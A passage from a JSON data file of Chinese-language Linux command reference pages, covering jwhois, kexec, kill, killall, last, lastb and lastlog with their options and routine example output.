class=\"hljs-keyword\">return</span>\n</code></pre>\n<blockquote>\n<p>注：以上英文部分寻求网友协助翻译，翻译结果可发送至 sa(at)linuxde.net，谢谢！</p>\n</blockquote>\n<h3 id=\"实例\">实例</h3>\n<p>显示指定用户信息：</p>\n<pre><code class=\"language-shell\"> <span class=\"hljs-keyword\">jwhois </span>root\n\n<span class=\"hljs-comment\"># 查找root用户信息</span>\n</code></pre>\n<p>查询域名信息：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-selector-attr\">[root@localhost ~]</span> jwhois linuxde<span class=\"hljs-selector-class\">.net</span>\n<span class=\"hljs-selector-attr\">[Querying whois.verisign-grs.com]</span>\n<span class=\"hljs-selector-attr\">[Redirected to whois.west263.com]</span>\n<span class=\"hljs-selector-attr\">[Querying whois.west263.com]</span>\n<span class=\"hljs-selector-attr\">[whois.west263.com]</span>\nDomain Name: linuxde<span class=\"hljs-selector-class\">.net</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;\nRegistry Domain id: whois protect\nRegistrar WHOIS Server: whois<span class=\"hljs-selector-class\">.west263</span><span class=\"hljs-selector-class\">.com</span>\n\n...省略部分内容\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "kernelversion",
        "des": "打印当前内核的主版本号",
        "body": "<h1 id=\"kernelversion\">kernelversion</h1>\n<p>打印当前内核的主版本号</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>kernelversion命令</strong> 用于打印当前内核的主版本号。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">kernelversion</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "kexec",
        "des": "从当前正在运行的内核引导到一个新内核",
        "body": "<h1 id=\"kexec\">kexec</h1>\n<p>从当前正在运行的内核引导到一个新内核</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>kexec命令</strong> 是Linux内核的一个补丁，让您可以从当前正在运行的内核直接引导到一个新内核。在上面描述的引导序列中，kexec跳过了整个引导装载程序阶段（第一部分）并直接跳转到我们希望引导到的内核。不再有硬件的重启，不再有固件操作，不再涉及引导装载程序。完全避开了引导序列中最弱的一环 -- 固件。这一功能部件带来的最大益处在于，系统现在可以极其快速地重新启动。</p>\n<p> <strong>kexec的好处：</strong> 要求高可用性的系统，以及需要不断重新启动系统的内核开发人员，都将受益于kexec。因为 kexec跳过了系统重新启动过程中最耗时的部分（也就是固件初始化硬件设备的阶段），所以重新启动变得非常快，可用性得到了提高。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">kexec</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-l：指定内核映像文件；</span>\n<span class=\"hljs-deletion\">-e：允许当前被加载的内核；</span>\n<span class=\"hljs-deletion\">-f：强制立即调用系统调用“kexec”，而不调用“shutdown”；</span>\n<span class=\"hljs-deletion\">-t：指定新内核的类型；</span>\n<span class=\"hljs-deletion\">-u：卸载当前的kexec目标内核。</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "kill",
        "des": "发送信号到进程。",
        "body": "<h1 id=\"kill\">kill</h1>\n<p>发送信号到进程。</p>\n<h2 id=\"目录\">目录</h2>\n<ul>\n<li><a href=\"#%E5%86%85%E5%BB%BA%E5%91%BD%E4%BB%A4\">bash内建命令</a></li>\n<li><a href=\"#%E5%A4%96%E9%83%A8%E5%91%BD%E4%BB%A4\">GNU coreutils中的命令</a></li>\n</ul>\n<h2 id=\"内建命令\">内建命令</h2>\n<h4 id=\"概要\">概要</h4>\n<pre><code class=\"language-shell\">kill [-s sigspec | <span class=\"hljs-type\">-n</span> signum | <span class=\"hljs-type\">-sigspec</span>] pid | <span class=\"hljs-type\">jobspec</span> ...\nkill -l [sigspec]\n</code></pre>\n<h4 id=\"主要用途\">主要用途</h4>\n<ul>\n<li>发送信号到作业或进程（可以为多个）。</li>\n<li>列出信号。</li>\n</ul>\n<h4 id=\"选项\">选项</h4>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-s sig    信号名称。</span>\n<span class=\"hljs-deletion\">-n sig    信号名称对应的数字。</span>\n<span class=\"hljs-deletion\">-l        列出信号名称。如果在该选项后提供了数字那么假设它是信号名称对应的数字。</span>\n<span class=\"hljs-deletion\">-L        等价于-l选项。</span>\n</code></pre>\n<h4 id=\"参数\">参数</h4>\n<p>pid：进程ID</p>\n<p>jobspec：作业标识符</p>\n<h4 id=\"返回值\">返回值</h4>\n<p>返回状态为成功除非给出了非法选项、执行出现错误。</p>\n<h4 id=\"例子\">例子</h4>\n<pre><code class=\"language-shell\">[user2@pc] kill -l 9\nKILL\n\n# 列出所有信号名称：\n[user2@pc] kill -l\n 1) SIGHUP       2) SIGINT       3) SIGQUIT      4) SIGILL\n 5) SIGTRAP      6) SIGABRT      7) SIGBUS       8) SIGFPE\n 9) SIGKILL     10) SIGUSR1     11) SIGSEGV     12) SIGUSR2\n13) SIGPIPE     14) SIGALRM     15) SIGTERM     16) SIGSTKFLT\n17) SIGCHLD     18) SIGCONT     19) SIGSTOP     20) SIGTSTP\n21) SIGTTIN     22) SIGTTOU     23) SIGURG      24) SIGXCPU\n25) SIGXFSZ     26) SIGVTALRM   27) SIGPROF     28) SIGWINCH\n29) SIGIO       30) SIGPWR      31) SIGSYS      34) SIGRTMIN\n35) SIGRTMIN<span class=\"hljs-string\">+1</span>  36) SIGRTMIN<span class=\"hljs-string\">+2</span>  37) SIGRTMIN<span class=\"hljs-string\">+3</span>  38) SIGRTMIN<span class=\"hljs-string\">+4</span>\n39) SIGRTMIN<span class=\"hljs-string\">+5</span>  40) SIGRTMIN<span class=\"hljs-string\">+6</span>  41) SIGRTMIN<span class=\"hljs-string\">+7</span>  42) SIGRTMIN<span class=\"hljs-string\">+8</span>\n43) SIGRTMIN<span class=\"hljs-string\">+9</span>  44) SIGRTMIN<span class=\"hljs-string\">+10</span> 45) SIGRTMIN<span class=\"hljs-string\">+11</span> 46) SIGRTMIN<span class=\"hljs-string\">+12</span>\n47) SIGRTMIN<span class=\"hljs-string\">+13</span> 48) SIGRTMIN<span class=\"hljs-string\">+14</span> 49) SIGRTMIN<span class=\"hljs-string\">+15</span> 50) SIGRTMAX<span class=\"hljs-string\">-14</span>\n51) SIGRTMAX<span class=\"hljs-string\">-13</span> 52) SIGRTMAX<span class=\"hljs-string\">-12</span> 53) SIGRTMAX<span class=\"hljs-string\">-11</span> 54) SIGRTMAX<span class=\"hljs-string\">-10</span>\n55) SIGRTMAX<span class=\"hljs-string\">-9</span>  56) SIGRTMAX<span class=\"hljs-string\">-8</span>  57) SIGRTMAX<span class=\"hljs-string\">-7</span>  58) SIGRTMAX<span class=\"hljs-string\">-6</span>\n59) SIGRTMAX<span class=\"hljs-string\">-5</span>  60) SIGRTMAX<span class=\"hljs-string\">-4</span>  61) SIGRTMAX<span class=\"hljs-string\">-3</span>  62) SIGRTMAX<span class=\"hljs-string\">-2</span>\n63) SIGRTMAX<span class=\"hljs-string\">-1</span>  64) SIGRTMAX\n\n# 下面是常用的信号。\n# 只有第9种信号(SIGKILL)才可以无条件终止进程，其他信号进程都有权利忽略。\n\nHUP     1    终端挂断\nINT     2    中断（同 Ctrl + C）\nQUIT    3    退出（同 Ctrl + \\）\nKILL    9    强制终止\nTERM   15    终止\nCONT   18    继续（与STOP相反，fg/bg命令）\nSTOP   19    暂停（同 Ctrl + Z）\n</code></pre>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 以下发送KILL信号的形式等价。当然还有更多的等价形式，在此不一一列举了。</span>\n[user2@pc] <span class=\"hljs-keyword\">kill</span> -s SIGKILL PID\n[user2@pc] <span class=\"hljs-keyword\">kill</span> -s KILL PID\n[user2@pc] <span class=\"hljs-keyword\">kill</span> -n <span class=\"hljs-number\">9</span> PID\n[user2@pc] <span class=\"hljs-keyword\">kill</span> -<span class=\"hljs-number\">9</span> PID\n\n[user2@pc] <span class=\"hljs-keyword\">sleep</span> <span class=\"hljs-number\">90</span> &amp;\n[<span class=\"hljs-number\">1</span>] <span class=\"hljs-number\">178420</span>\n\n<span class=\"hljs-comment\"># 终止作业标识符为1的作业。</span>\n[user2@pc] <span class=\"hljs-keyword\">kill</span> -<span class=\"hljs-number\">9</span> %1\n\n[user2@pc] jobs -l\n[<span class=\"hljs-number\">1</span>]+ <span class=\"hljs-number\">178420</span> KILLED                  ssh <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">1.4</span>\n\n[user2@pc] <span class=\"hljs-keyword\">sleep</span> <span class=\"hljs-number\">90</span> &amp;\n[<span class=\"hljs-number\">1</span>] <span class=\"hljs-number\">181357</span>\n\n<span class=\"hljs-comment\"># 发送停止信号。</span>\n[user2@pc] <span class=\"hljs-keyword\">kill</span> -s STOP <span class=\"hljs-number\">181357</span>\n\n[user2@pc] jobs -l\n[<span class=\"hljs-number\">1</span>]+ <span class=\"hljs-number\">181537</span> Stopped (signal)        <span class=\"hljs-keyword\">sleep</span> <span class=\"hljs-number\">90</span>\n\n<span class=\"hljs-comment\"># 发送继续信号。</span>\n[user2@pc] <span class=\"hljs-keyword\">kill</span> -s CONT <span class=\"hljs-number\">181357</span>\n\n[user2@pc] jobs -l\n[<span class=\"hljs-number\">1</span>]+ <span class=\"hljs-number\">181537</span> Running                 <span class=\"hljs-keyword\">sleep</span> <span class=\"hljs-number\">90</span> &amp;\n</code></pre>\n<h4 id=\"注意\">注意</h4>\n<ol>\n<li><code>bash</code>的作业控制命令包括<code>bg fg kill wait disown suspend</code>。</li>\n<li>该命令是bash内建命令，相关的帮助信息请查看<code>help</code>命令。</li>\n</ol>\n<h2 id=\"外部命令\">外部命令</h2>\n<h4 id=\"概要-1\">概要</h4>\n<pre><code class=\"language-shell\">kill [-signal|-s signal|-p] [-q value] [-a] [--] pid|name...\nkill -l [number] | -<span class=\"hljs-symbol\">L</span>\n</code></pre>\n<h4 id=\"主要用途-1\">主要用途</h4>\n<ul>\n<li><p>发送信号到进程（可以为多个）。</p>\n</li>\n<li><p>列出信号。</p>\n</li>\n</ul>\n<h4 id=\"选项-1\">选项</h4>\n<pre><code class=\"language-shell\">-<span class=\"hljs-string\">s</span>, <span class=\"hljs-built_in\">--signal</span> <span class=\"hljs-string\">signal</span>    要发送的信号，可能是信号名称或信号对应的数字。\n-<span class=\"hljs-string\">l</span>, <span class=\"hljs-built_in\">--list</span> [<span class=\"hljs-string\">number</span>]    打印信号名称或转换给定数字到信号名称。信号名称可参考文件（/<span class=\"hljs-string\">usr</span>/<span class=\"hljs-string\">include</span>/<span class=\"hljs-string\">linux</span>/<span class=\"hljs-string\">signal</span>.<span class=\"hljs-string\">h</span>）。\n-<span class=\"hljs-string\">L</span>, <span class=\"hljs-built_in\">--table</span>            和<span class=\"hljs-string\">'-l'</span>选项类似，但是输出信号名称以及信号对应的数字。\n-<span class=\"hljs-string\">a</span>, <span class=\"hljs-built_in\">--all</span>              不要限制“命令名到<span class=\"hljs-string\">pid</span>”的转换为具有与当前进程相同的<span class=\"hljs-string\">UID</span>的进程。\n-<span class=\"hljs-string\">p</span>, <span class=\"hljs-built_in\">--pid</span>              打印目标进程的<span class=\"hljs-string\">PID</span>而不发送信号。\n<span class=\"hljs-built_in\">--verbose</span>              打印信号以及接收信号的<span class=\"hljs-string\">PID</span>。\n-<span class=\"hljs-string\">q</span>, <span class=\"hljs-built_in\">--queue</span> <span class=\"hljs-string\">value</span>      使用<span class=\"hljs-string\">sigqueue</span>(<span class=\"hljs-string\">3</span>)而不是<span class=\"hljs-string\">kill</span>(<span class=\"hljs-string\">2</span>)。参数<span class=\"hljs-string\">value</span>是信号对应的数字。\n                           如果接收进程已为此信号安装了处理程序将<span class=\"hljs-string\">SA_SIGINFO</span>标记为<span class=\"hljs-string\">sigaction</span>(<span class=\"hljs-string\">2</span>)，则可以获取\n                           该数据通过<span class=\"hljs-string\">siginfo_t</span>结构的<span class=\"hljs-string\">si_sigval</span>字段。\n<span class=\"hljs-built_in\">--help</span>                 显示帮助信息并退出。\n<span class=\"hljs-built_in\">--version</span>              显示版本信息并退出。\n</code></pre>\n<h4 id=\"参数-1\">参数</h4>\n<p>接收信号的进程列表可以是PID以及name的混合组成。</p>\n<p>PID：每一个PID可以是以下四种情况之一：</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">状态</th>\n<th align=\"center\">说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">n</td>\n<td align=\"center\">当n大于0时，PID为n的进程接收信号。</td>\n</tr>\n<tr>\n<td align=\"center\">0</td>\n<td align=\"center\">当前进程组中的所有进程均接收信号。</td>\n</tr>\n<tr>\n<td align=\"center\">-1</td>\n<td align=\"center\">PID大于1的所有进程均接收信号。</td>\n</tr>\n<tr>\n<td align=\"center\">-n</td>\n<td align=\"center\">当n大于1时，进程组n中的所有进程接收信号。当给出了一个参数的形式为“-n”，想要让它表示一个进程组，那么必须首先指定一个信号，或参数前必须有一个“--”选项，否则它将被视为发送的信号。</td>\n</tr>\n</tbody></table>\n<p>name：使用此名称调用的所有进程将接收信号。</p>\n<h4 id=\"例子-1\">例子</h4>\n<pre><code class=\"language-shell\">&gt; <span class=\"hljs-keyword\">sleep</span> <span class=\"hljs-number\">20</span> &amp;\n\n<span class=\"hljs-comment\"># 列出对应的PID。</span>\n&gt; <span class=\"hljs-keyword\">kill</span> -p <span class=\"hljs-keyword\">sleep</span>\n<span class=\"hljs-number\">23021</span>\n</code></pre>\n<h4 id=\"返回值-1\">返回值</h4>\n<ul>\n<li>0 成功。</li>\n<li>1 失败。</li>\n<li>64 部分成功（当指定了多个进程时）。</li>\n</ul>\n<h4 id=\"注意-1\">注意</h4>\n<ol>\n<li>该命令是<code>GNU coreutils</code>包中的命令，相关的帮助信息请查看<code>man -s 1 kill</code>或<code>info coreutils 'kill invocation'</code>。</li>\n<li>启动或关闭内建命令请查看<code>enable</code>命令，关于同名优先级的问题请查看<code>builtin</code>命令的例子部分的相关讨论。</li>\n<li>与<code>kill</code>命令类似的有<code>xkill</code>，<code>pkill</code>,<code>killall</code>等，用于不同的目的和场景。</li>\n</ol>\n<h4 id=\"参考链接\">参考链接</h4>\n<p><a href=\"https://bash.cyberciti.biz/guide/Sending_signal_to_Processes\">发送信号到进程</a></p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "killall",
        "des": "使用进程的名称来杀死一组进程",
        "body": "<h1 id=\"killall\">killall</h1>\n<p>使用进程的名称来杀死一组进程</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>killall命令</strong> 使用进程的名称来杀死进程，使用此指令可以杀死一组同名进程。我们可以使用kill命令杀死指定进程PID的进程，如果要找到我们需要杀死的进程，我们还需要在之前使用ps等命令再配合grep来查找进程，而killall把这两个过程合二为一，是一个很好用的命令。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">killall</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-e：对长名称进行精确匹配；</span>\n<span class=\"hljs-deletion\">-l：忽略大小写的不同；</span>\n<span class=\"hljs-deletion\">-p：杀死进程所属的进程组；</span>\n<span class=\"hljs-deletion\">-i：交互式杀死进程，杀死进程前需要进行确认；</span>\n<span class=\"hljs-deletion\">-l：打印所有已知信号列表；</span>\n<span class=\"hljs-deletion\">-q：如果没有进程被杀死。则不输出任何信息；</span>\n<span class=\"hljs-deletion\">-r：使用正规表达式匹配要杀死的进程名称；</span>\n<span class=\"hljs-deletion\">-s：用指定的进程号代替默认信号“SIGTERM”；</span>\n<span class=\"hljs-deletion\">-u：杀死指定用户的进程。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>进程名称：指定要杀死的进程名称。</p>\n<h3 id=\"实例\">实例</h3>\n<p>杀死所有同名进程</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">killall vi</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "last",
        "des": "列出目前与过去登入系统的用户相关信息",
        "body": "<h1 id=\"last\">last</h1>\n<p>列出目前与过去登入系统的用户相关信息</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>last命令</strong> 用于显示用户最近登录信息。单独执行last命令，它会读取<code>/var/log/wtmp</code>的文件，并把该给文件的内容记录的登入系统的用户名单全部显示出来。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">last</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-a：把从何处登入系统的主机名称或ip地址，显示在最后一行；</span>\n<span class=\"hljs-deletion\">-d：将IP地址转换成主机名称；</span>\n<span class=\"hljs-deletion\">-f &lt;记录文件&gt;：指定记录文件。</span>\n<span class=\"hljs-deletion\">-n &lt;显示列数&gt;或-&lt;显示列数&gt;：设置列出名单的显示列数；</span>\n<span class=\"hljs-deletion\">-R：不显示登入系统的主机名称或IP地址；</span>\n<span class=\"hljs-deletion\">-x：显示系统关机，重新开机，以及执行等级的改变等信息。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>  用户名：显示用户登录列表；</li>\n<li>  终端：显示从指定终端的登录列表。</li>\n</ul>\n<h3 id=\"实例\">实例</h3>\n<p>last命令用了显示用户登录情况，以下是直接显示固定行数的记录：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">last</span> -<span class=\"hljs-number\">10</span>\n<span class=\"hljs-attribute\">root</span>     pts/<span class=\"hljs-number\">0</span>        <span class=\"hljs-number\">221.6.45.34</span>      Tue Dec <span class=\"hljs-number\">17</span> <span class=\"hljs-number\">09</span>:<span class=\"hljs-number\">40</span>   still logged in\n<span class=\"hljs-attribute\">root</span>     pts/<span class=\"hljs-number\">0</span>        <span class=\"hljs-number\">221.6.45.34</span>      Mon Dec <span class=\"hljs-number\">16</span> <span class=\"hljs-number\">09</span>:<span class=\"hljs-number\">00</span> - <span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">57</span>  (<span class=\"hljs-number\">02</span>:<span class=\"hljs-number\">56</span>)\n<span class=\"hljs-attribute\">root</span>     pts/<span class=\"hljs-number\">0</span>        <span class=\"hljs-number\">222.94.97.122</span>    Sun Dec <span class=\"hljs-number\">15</span> <span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">39</span> - <span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">28</span>  (<span class=\"hljs-number\">02</span>:<span class=\"hljs-number\">48</span>)\n<span class=\"hljs-attribute\">root</span>     pts/<span class=\"hljs-number\">0</span>        <span class=\"hljs-number\">222.95.209.80</span>    Sat Dec <span class=\"hljs-number\">14</span> <span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">39</span> - <span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">58</span>  (<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">18</span>)\n<span class=\"hljs-attribute\">root</span>     pts/<span class=\"hljs-number\">0</span>        <span class=\"hljs-number\">221.6.45.34</span>      Thu Dec <span class=\"hljs-number\">12</span> <span class=\"hljs-number\">16</span>:<span class=\"hljs-number\">55</span> - <span class=\"hljs-number\">17</span>:<span class=\"hljs-number\">37</span>  (<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">41</span>)\n<span class=\"hljs-attribute\">root</span>     pts/<span class=\"hljs-number\">0</span>        <span class=\"hljs-number\">49.65.139.195</span>    Wed Dec <span class=\"hljs-number\">11</span> <span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">40</span> - <span class=\"hljs-number\">21</span>:<span class=\"hljs-number\">16</span>  (<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">35</span>)\n<span class=\"hljs-attribute\">root</span>     pts/<span class=\"hljs-number\">0</span>        <span class=\"hljs-number\">49.65.139.195</span>    Wed Dec <span class=\"hljs-number\">11</span> <span class=\"hljs-number\">19</span>:<span class=\"hljs-number\">46</span> - <span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">03</span>  (<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">17</span>)\n<span class=\"hljs-attribute\">root</span>     pts/<span class=\"hljs-number\">0</span>        <span class=\"hljs-number\">221.6.45.34</span>      Tue Dec <span class=\"hljs-number\">10</span> <span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">41</span> - <span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">52</span>  (<span class=\"hljs-number\">01</span>:<span class=\"hljs-number\">10</span>)\n<span class=\"hljs-attribute\">root</span>     pts/<span class=\"hljs-number\">0</span>        <span class=\"hljs-number\">221.6.45.34</span>      Mon Dec  <span class=\"hljs-number\">9</span> <span class=\"hljs-number\">17</span>:<span class=\"hljs-number\">24</span> - <span class=\"hljs-number\">17</span>:<span class=\"hljs-number\">30</span>  (<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">06</span>)\n<span class=\"hljs-attribute\">root</span>     pts/<span class=\"hljs-number\">0</span>        <span class=\"hljs-number\">221.6.45.34</span>      Mon Dec  <span class=\"hljs-number\">9</span> <span class=\"hljs-number\">09</span>:<span class=\"hljs-number\">38</span> - <span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">41</span>  (<span class=\"hljs-number\">02</span>:<span class=\"hljs-number\">02</span>)\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "lastb",
        "des": "列出登入系统失败的用户相关信息",
        "body": "<h1 id=\"lastb\">lastb</h1>\n<p>列出登入系统失败的用户相关信息</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>lastb命令</strong> 用于显示用户错误的登录列表，此指令可以发现系统的登录异常。单独执行lastb命令，它会读取位于<code>/var/log</code>目录下，名称为btmp的文件，并把该文件内容记录的登入失败的用户名单，全部显示出来。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">lastb</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-a：把从何处登入系统的主机名称或ip地址显示在最后一行；</span>\n<span class=\"hljs-deletion\">-d：将IP地址转换成主机名称；</span>\n<span class=\"hljs-deletion\">-f&lt;记录文件&gt;：指定记录文件；</span>\n<span class=\"hljs-deletion\">-n&lt;显示列数&gt;或-&lt;显示列数&gt;：设置列出名单的显示列数；</span>\n<span class=\"hljs-deletion\">-R：不显示登入系统的主机名称或IP地址；</span>\n<span class=\"hljs-deletion\">-x：显示系统关机，重新开机，以及执行等级的改变等信息。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>  用户名：显示中的用户的登录列表；</li>\n<li>  终端：显示从指定终端的登录列表。</li>\n</ul>\n<h3 id=\"实例\">实例</h3>\n<p>首次运行lastb命令会报下的错误：</p>\n<pre><code class=\"language-shell\">lastb: /var/<span class=\"hljs-built_in\">log</span>/btmp: No such <span class=\"hljs-built_in\">file</span> <span class=\"hljs-keyword\">or</span> <span class=\"hljs-built_in\">directory</span>\nPerhaps this <span class=\"hljs-built_in\">file</span> was removed <span class=\"hljs-keyword\">by</span> <span class=\"hljs-keyword\">the</span> operator <span class=\"hljs-built_in\">to</span> prevent logging lastb info.\n</code></pre>\n<p>只需建立这个不存在的文件即可。</p>\n<pre><code class=\"language-shell\">touch <span class=\"hljs-regexp\">/var/</span>log/btmp\n</code></pre>\n<p>使用ssh的登录失败不会记录在btmp文件中。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">lastb</span> | head\n<span class=\"hljs-attribute\">root</span>     ssh:notty    <span class=\"hljs-number\">110.84.129.3</span>     Tue Dec <span class=\"hljs-number\">17</span> <span class=\"hljs-number\">06</span>:<span class=\"hljs-number\">19</span> - <span class=\"hljs-number\">06</span>:<span class=\"hljs-number\">19</span>  (<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>)\n<span class=\"hljs-attribute\">root</span>     ssh:notty    <span class=\"hljs-number\">110.84.129.3</span>     Tue Dec <span class=\"hljs-number\">17</span> <span class=\"hljs-number\">04</span>:<span class=\"hljs-number\">05</span> - <span class=\"hljs-number\">04</span>:<span class=\"hljs-number\">05</span>  (<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>)\n<span class=\"hljs-attribute\">root</span>     ssh:notty    <span class=\"hljs-number\">110.84.129.3</span>     Tue Dec <span class=\"hljs-number\">17</span> <span class=\"hljs-number\">01</span>:<span class=\"hljs-number\">52</span> - <span class=\"hljs-number\">01</span>:<span class=\"hljs-number\">52</span>  (<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>)\n<span class=\"hljs-attribute\">root</span>     ssh:notty    <span class=\"hljs-number\">110.84.129.3</span>     Mon Dec <span class=\"hljs-number\">16</span> <span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">38</span> - <span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">38</span>  (<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>)\n<span class=\"hljs-attribute\">leonob</span>   ssh:notty    <span class=\"hljs-number\">222.211.85.18</span>    Mon Dec <span class=\"hljs-number\">16</span> <span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">18</span> - <span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">18</span>  (<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>)\n<span class=\"hljs-attribute\">leonob</span>   ssh:notty    <span class=\"hljs-number\">222.211.85.18</span>    Mon Dec <span class=\"hljs-number\">16</span> <span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">18</span> - <span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">18</span>  (<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>)\n<span class=\"hljs-attribute\">root</span>     ssh:notty    <span class=\"hljs-number\">110.84.129.3</span>     Mon Dec <span class=\"hljs-number\">16</span> <span class=\"hljs-number\">21</span>:<span class=\"hljs-number\">25</span> - <span class=\"hljs-number\">21</span>:<span class=\"hljs-number\">25</span>  (<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>)\n<span class=\"hljs-attribute\">root</span>     ssh:notty    <span class=\"hljs-number\">110.84.129.3</span>     Mon Dec <span class=\"hljs-number\">16</span> <span class=\"hljs-number\">19</span>:<span class=\"hljs-number\">12</span> - <span class=\"hljs-number\">19</span>:<span class=\"hljs-number\">12</span>  (<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>)\n<span class=\"hljs-attribute\">root</span>     ssh:notty    <span class=\"hljs-number\">110.84.129.3</span>     Mon Dec <span class=\"hljs-number\">16</span> <span class=\"hljs-number\">17</span>:<span class=\"hljs-number\">00</span> - <span class=\"hljs-number\">17</span>:<span class=\"hljs-number\">00</span>  (<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>)\n<span class=\"hljs-attribute\">admin</span>    ssh:notty    <span class=\"hljs-number\">129.171.193.99</span>   Mon Dec <span class=\"hljs-number\">16</span> <span class=\"hljs-number\">16</span>:<span class=\"hljs-number\">52</span> - <span class=\"hljs-number\">16</span>:<span class=\"hljs-number\">52</span>  (<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>)\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "lastlog",
        "des": "显示系统中所有用户最近一次登录信息",
        "body": "<h1 id=\"lastlog\">lastlog</h1>\n<p>显示系统中所有用户最近一次登录信息</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>lastlog命令</strong> 用于显示系统中所有用户最近一次登录信息。</p>\n<p>lastlog文件在每次有用户登录时被查询。可以使用lastlog命令检查某特定用户上次登录的时间，并格式化输出上次登录日志<code>/var/log/lastlog</code>的内容。它根据UID排序显示登录名、端口号（tty）和上次登录时间。如果一个用户从未登录过，lastlog显示<code>**Never logged**</code>。注意需要以root身份运行该命令。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">lastlog</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-b&lt;天数&gt;：显示指定天数前的登录信息；</span>\n<span class=\"hljs-deletion\">-h：显示召集令的帮助信息；</span>\n<span class=\"hljs-deletion\">-t&lt;天数&gt;：显示指定天数以来的登录信息；</span>\n<span class=\"hljs-deletion\">-u&lt;用户名&gt;：显示指定用户的最近登录信息。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\">lastlog\nUsername         Port     From             Latest\nroot             pts/0    221.6.45.34      Tue Dec 